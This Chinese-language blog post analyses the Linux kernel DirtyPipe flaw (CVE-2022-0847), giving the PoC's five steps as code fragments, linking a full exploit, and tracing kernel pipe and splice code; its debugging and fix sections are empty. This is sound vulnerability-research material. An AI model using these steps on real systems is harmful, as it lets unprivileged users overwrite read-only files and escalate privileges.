---
layout:     post
title:  Linux 内核CVE：CVE-2022-0847
subtitle:   Linux 内核 DirtyPipe 任意只读文件覆写漏洞分析
date:       2025-08-03
author:     pandaychen
header-img:
catalog: true
tags:
    - Linux
    - Kernel
---

##  0x00    前言
前文[Linux 内核之旅（十五）：管道的实现](https://pandaychen.github.io/2025/07/01/A-LINUX-KERNEL-TRAVEL-15/)介绍了管道机制的内核实现原理，本文学习一个基于管道机制的非常有趣的CVE实现：[CVE-2022-0847](https://dirtypipe.cm4all.com/)

本文基于漏洞影响版本[v5.13](https://elixir.bootlin.com/linux/v5.13)来进行分析

##  0x01    CVE介绍
相关的poc代码[参考此](https://github.com/pandaychen/ebpf-allinone/blob/main/cve/2022-0847.c)，抽象为如下代码结构，这里面包含的五个步骤缺一不可

```CPP
// 1、创建管道
int p[2];
pipe(p);

// 2、填充管道（创建带有PIPE_BUF_FLAG_CAN_MERGE标志的缓冲区）
for (int i = 0; i < 8; i++)
    write(p[1], "A", 1);

// 3、清空管道（保留缓冲区结构）
for (int i = 0; i < 8; i++)
    read(p[0], &buf, 1);

// 4、使用splice将文件内容导入管道（关键漏洞触发点）
ssize_t nbytes = splice(file_fd, &file_offset, p[1], NULL, 1, 0);

// 5、向管道写入恶意数据（利用漏洞覆盖文件缓存）
write(p[1], evil_data, evil_data_len);
```

1、在受影响内核版本中，使用 `splice` 系统调用从一个只读文件（如`-r--r--r--`）向一个管道中传输数据时，会使管道用于保存数据的缓冲区共享文件的 page cache，从而实现零拷贝。但是，由于 `PIPE_BUF_FLAG_CAN_MERGE` 标志位的存在，调用 `splice` 之后再向管道中写入数据时，写入的数据会直接写到文件的 page cache 中（虽然文件是只读，但是可以通过这种巧妙的方式写入到文件page cache）

2、当另一个进程（可能是系统相关）在读此文件时，会触发读到page cache（Buffered IO），由于该文件的page cache已经被污染了，所以读到的是上一步中的写入后的脏页数据

3、低权限用户可利用此漏洞向本没有写权限的文件中写入数据，进而实现提权等恶意行为

####   POC代码的若干细节
先介绍下漏洞利用涉及的若干细节：

-   创建一个管道（不指定 `O_DIRECT`）
-   将管道填充满（通过 `write()-->pipe_write()`每次写入整页），这样所有的 pipe 缓存页都初始化过了，`pipe->flags` 被初始化为`PIPE_BUF_FLAG_CAN_MERGE`，关联[代码](https://github.com/pandaychen/ebpf-allinone/blob/main/cve/2022-0847.c#L57)
-   将管道清空（通过`read()-->pipe_read()`），这样通过 `splice` 系统调用传送文件的时候就会使用原有的初始化过的buf结构，关联[代码](https://github.com/pandaychen/ebpf-allinone/blob/main/cve/2022-0847.c#L65)
-   打开待覆写文件，调用 `splice()` 将往pipe写入`1`字节（这样才能将page cache索引到`pipe_buffer`），关联[代码](https://github.com/pandaychen/ebpf-allinone/blob/main/cve/2022-0847.c#L134C53-L134C54)
-   最后，调用 `write()` 继续向pipe写入小于`1`页的数据（`write()-->pipe_write()`），这时就会覆盖到文件缓存页了，暂时篡改了目标文件。只要没有其他可写权限的程序进行`write`操作，该页面并不会被内核标记为dirty（内核其实也并不知道），也就不会进行页面缓存写会磁盘的操作，此时其他进程读文件会命中页面缓存，从而读取到篡改后到文件数据， 但重启后文件会变回原来的状态

####    漏洞限制
-   被"覆写"的目标文件必须拥有可读权限，否则`splice()`无法进行
-   由于是在`pipe_buffer`中覆写页面缓存的数据，又需要`splice()`读取至少`1`字节的数据进入管道，所以覆盖时，每个页面的第一个字节是不可修改的，同样的原因，单次写入的数据量也不能大于`4kB`，思考下，这个操作的意义是什么？
-   由于需要写入的页面都是内核通过文件IO读取的page cache, 所以任意写入文件只能是单纯的覆写，不能调整文件的大小
-   漏洞被命名为 DirtyPipe，和 CVE-2016-5195 DirtyCOW 一样，两个漏洞的触发点都在于Linux内核对于文件读写操作的优化（写时拷贝/零拷贝）。DirtyPipe的利用方法更简单，因为不需要竞争，顺序操作就能直接触发漏洞

####    漏洞利用演示
`testfile`的权限为`-r--r--r--`，原始文件内容为`this is a test file`，通过poc可完成"写入"功能，如下图所示：

![5.png]()

![4.png]()

##  0x02    漏洞原理分析
前文已经描述了`4.11.6`版本相关的实现机制，这里就基于POC的核心代码先标注出关键的内核函数，作为后面breakpoint所用（假设存储类型为ext4）

####    基础知识
1、 管道的文件操作类型`pipefifo_fops` 是一个 `struct file_operations` 类型的常量，定义了 pipe 类型支持的文件操作集合

```CPP
const struct file_operations pipefifo_fops = {
    .open        = fifo_open,
    .llseek        = no_llseek,
    .read_iter    = pipe_read,
    .write_iter    = pipe_write,
    .poll        = pipe_poll,
    .unlocked_ioctl    = pipe_ioctl,
    .release    = pipe_release,
    .fasync        = pipe_fasync,
};
```

####    1、创建管道
管道（pipe）是内核提供的一种通信机制，通过`pipe`/`pipe2`函数创建，返回两个文件描述符，一个用于发送数据，另一个用于接收数据，类似管道的两端。在内核实现中，通常管道缓存总长度`65536`字节，使用页（物理页）的形式进行管理，总共`16`页（每页`4096`字节），页面之间并不连续，而是通过数组[指针](https://elixir.bootlin.com/linux/v5.13/source/include/linux/pipe_fs_i.h#L76)进行管理，形成一个环形结构。内核实现中，管道会维护两个指针，其中`pipe->head`用来写管道头，`pipe->tail`用来读管道尾

```cpp
int p[2];
pipe(p);
```

![pipe_inode_info_init.png]()


####    2、填充管道 
第二步，对应的POC代码片段为：
```cpp
const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
static char buffer[4096];

/* fill the pipe completely; each pipe_buffer will now have
    the PIPE_BUF_FLAG_CAN_MERGE flag */
for (unsigned r = pipe_size; r > 0;) {
    unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    write(p[1], buffer, n);
    r -= n;
}
```

第二步，填充管道（创建带有`PIPE_BUF_FLAG_CAN_MERGE`标志的缓冲区），主要的操作是调用`write`函数写管道，这里关联的内核调用链为：

```CPP
write
    |- vfs_write
        |- new_sync_write
            |- call_write_iter
                |- pipe_write
```

内核调用的代码片段如下：

```CPP
ssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos)
{
    ......
    if (file->f_op->write)
        ret = file->f_op->write(file, buf, count, pos);
    else if (file->f_op->write_iter){
        // pipe 实现了 write_iter 而不是 write
        // call new_sync_write
        ret = new_sync_write(file, buf, count, pos);
    }
    ......
}

static ssize_t new_sync_write(struct file *filp, const char __user *buf, size_t len, loff_t *ppos)
{
    struct iovec iov = { .iov_base = (void __user *)buf, .iov_len = len };
    struct kiocb kiocb;
    struct iov_iter iter;
    ssize_t ret;

    init_sync_kiocb(&kiocb, filp);
    kiocb.ki_pos = (ppos ? *ppos : 0);
    iov_iter_init(&iter, WRITE, &iov, 1, len);
    // call call_write_iter
    ret = call_write_iter(filp, &kiocb, &iter);
    BUG_ON(ret == -EIOCBQUEUED);
    if (ret > 0 && ppos)
        *ppos = kiocb.ki_pos;
    return ret;
}

static inline ssize_t call_write_iter(struct file *file, struct kiocb *kio,
                      struct iov_iter *iter)
{   
    // call pipe_write
    return file->f_op->write_iter(kio, iter);
}
```


这里跟踪到内核代码[`pipe_write`](https://elixir.bootlin.com/linux/v5.13/source/fs/pipe.c#L401)分析下：

```CPP
static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)
{
	struct file *filp = iocb->ki_filp;
	struct pipe_inode_info *pipe = filp->private_data;
	unsigned int head;
	ssize_t ret = 0;
	size_t total_len = iov_iter_count(from);
	ssize_t chars;
	bool was_empty = false;
	bool wake_next_writer = false;

	/* Null write succeeds. */
	if (unlikely(total_len == 0))
		return 0;

	__pipe_lock(pipe);

	if (!pipe->readers) {
		send_sig(SIGPIPE, current, 0);
		ret = -EPIPE;
		goto out;
	}

#ifdef CONFIG_WATCH_QUEUE
	if (pipe->watch_queue) {
		ret = -EXDEV;
		goto out;
	}
#endif

	/*
	 * Only wake up if the pipe started out empty, since
	 * otherwise there should be no readers waiting.
	 *
	 * If it wasn't empty we try to merge new data into
	 * the last buffer.
	 *
	 * That naturally merges small writes, but it also
	 * page-aligs the rest of the writes for large writes
	 * spanning multiple pages.
	 */
	head = pipe->head;
	was_empty = pipe_empty(head, pipe->tail);
	chars = total_len & (PAGE_SIZE-1);
	if (chars && !was_empty) {
		unsigned int mask = pipe->ring_size - 1;
		struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];
		int offset = buf->offset + buf->len;

		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			if (unlikely(ret < chars)) {
				ret = -EFAULT;
				goto out;
			}

			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}

	for (;;) {
		if (!pipe->readers) {
			send_sig(SIGPIPE, current, 0);
			if (!ret)
				ret = -EPIPE;
			break;
		}

		head = pipe->head;
		if (!pipe_full(head, pipe->tail, pipe->max_usage)) {
			unsigned int mask = pipe->ring_size - 1;
			struct pipe_buffer *buf = &pipe->bufs[head & mask];
			struct page *page = pipe->tmp_page;
			int copied;

			if (!page) {
				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);
				if (unlikely(!page)) {
					ret = ret ? : -ENOMEM;
					break;
				}
				pipe->tmp_page = page;
			}

			/* Allocate a slot in the ring in advance and attach an
			 * empty buffer.  If we fault or otherwise fail to use
			 * it, either the reader will consume it or it'll still
			 * be there for the next write.
			 */
			spin_lock_irq(&pipe->rd_wait.lock);

			head = pipe->head;
			if (pipe_full(head, pipe->tail, pipe->max_usage)) {
				spin_unlock_irq(&pipe->rd_wait.lock);
				continue;
			}

			pipe->head = head + 1;
			spin_unlock_irq(&pipe->rd_wait.lock);

			/* Insert it into the buffer array */
			buf = &pipe->bufs[head & mask];
			buf->page = page;
			buf->ops = &anon_pipe_buf_ops;
			buf->offset = 0;
			buf->len = 0;
			if (is_packetized(filp))
				buf->flags = PIPE_BUF_FLAG_PACKET;
			else
				buf->flags = PIPE_BUF_FLAG_CAN_MERGE;
			pipe->tmp_page = NULL;

			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
			if (unlikely(copied < PAGE_SIZE && iov_iter_count(from))) {
				if (!ret)
					ret = -EFAULT;
				break;
			}
			ret += copied;
			buf->offset = 0;
			buf->len = copied;

			if (!iov_iter_count(from))
				break;
		}

		if (!pipe_full(head, pipe->tail, pipe->max_usage))
			continue;

		/* Wait for buffer space to become available. */
		if (filp->f_flags & O_NONBLOCK) {
			if (!ret)
				ret = -EAGAIN;
			break;
		}
		if (signal_pending(current)) {
			if (!ret)
				ret = -ERESTARTSYS;
			break;
		}

		/*
		 * We're going to release the pipe lock and wait for more
		 * space. We wake up any readers if necessary, and then
		 * after waiting we need to re-check whether the pipe
		 * become empty while we dropped the lock.
		 */
		__pipe_unlock(pipe);
		if (was_empty) {
			wake_up_interruptible_sync_poll(&pipe->rd_wait, EPOLLIN | EPOLLRDNORM);
			kill_fasync(&pipe->fasync_readers, SIGIO, POLL_IN);
		}
		wait_event_interruptible_exclusive(pipe->wr_wait, pipe_writable(pipe));
		__pipe_lock(pipe);
		was_empty = pipe_empty(pipe->head, pipe->tail);
		wake_next_writer = true;
	}
out:
	if (pipe_full(pipe->head, pipe->tail, pipe->max_usage))
		wake_next_writer = false;
	__pipe_unlock(pipe);

	/*
	 * If we do do a wakeup event, we do a 'sync' wakeup, because we
	 * want the reader to start processing things asap, rather than
	 * leave the data pending.
	 *
	 * This is particularly important for small writes, because of
	 * how (for example) the GNU make jobserver uses small writes to
	 * wake up pending jobs
	 */
	if (was_empty) {
		wake_up_interruptible_sync_poll(&pipe->rd_wait, EPOLLIN | EPOLLRDNORM);
		kill_fasync(&pipe->fasync_readers, SIGIO, POLL_IN);
	}
	if (wake_next_writer)
		wake_up_interruptible_sync_poll(&pipe->wr_wait, EPOLLOUT | EPOLLWRNORM);
	if (ret > 0 && sb_start_write_trylock(file_inode(filp)->i_sb)) {
		int err = file_update_time(filp);
		if (err)
			ret = err;
		sb_end_write(file_inode(filp)->i_sb);
	}
	return ret;
}
```

####    3、清空管道（保留缓冲区结构）
第三步主要操作是调用`read`函数读取管道，这里关联的内核调用链为：

```CPP
 /* drain the pipe, freeing all pipe_buffer instances (but
      leaving the flags initialized) */
for (unsigned r = pipe_size; r > 0;) {
    unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
    read(p[0], buffer, n);
    r -= n;
}
```

####    4、
使用splice将文件内容导入管道（关键漏洞触发点）

```CPP
ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
if (nbytes < 0) {
    perror("splice failed");
    return EXIT_FAILURE;
}
```

主要操作是调用`splice`函数将只读文件的fd关联的page cache与管道核心结构`pipe_buffer->page`，这里涉及的内核调用链为：

####    5、
向管道写入恶意数据（利用漏洞覆盖文件缓存），主要操作是调用`write`函数向管道写入数据，这里关联的内核调用链为：

```CPP
nbytes = write(p[1], data, data_size);
if (nbytes < 0) {
    perror("write failed");
    return EXIT_FAILURE;
}
```


##  0x03    漏洞调试


##  0x04    总结

####    修复


##  0x05 参考
-   [Linux 内核 DirtyPipe 任意只读文件覆写漏洞（CVE-2022-0847）分析](https://www.anquanke.com/post/id/269886)
-   [CVE-2022-0847 Dirty Pipe linux内核提权分析](https://github.com/chenaotian/CVE-2022-0847)
-   [终端安全：DirtyPipe（CVE-2022-0847）漏洞分析](https://www.freebuf.com/vuls/335382.html)